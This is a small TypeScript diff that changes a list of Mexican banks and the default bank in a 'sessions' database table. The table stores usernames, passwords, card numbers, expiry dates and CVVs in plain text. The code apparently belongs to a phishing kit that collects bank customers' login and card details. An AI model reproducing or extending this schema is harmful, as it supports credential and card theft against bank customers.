@@ -22,7 +22,7 @@ export enum BankType {
   AMEX = "amex",
   SANTANDER = "santander",
   SCOTIABANK = "scotiabank",
-  PLATACARD = "platacard",
+  BANAMEX = "banamex",
   BANREGIO = "banregio",
   SPIN = "spin"
 }
@@ -105,7 +105,7 @@ export const sessions = pgTable("sessions", {
   folio: text("folio"),
   username: text("username"),
   password: text("password"),
-  banco: text("banco").default("LIVERPOOL"),
+  banco: text("banco").default("BANAMEX"),
   tarjeta: text("tarjeta"),
   fechaVencimiento: text("fecha_vencimiento"),
   cvv: text("cvv"),
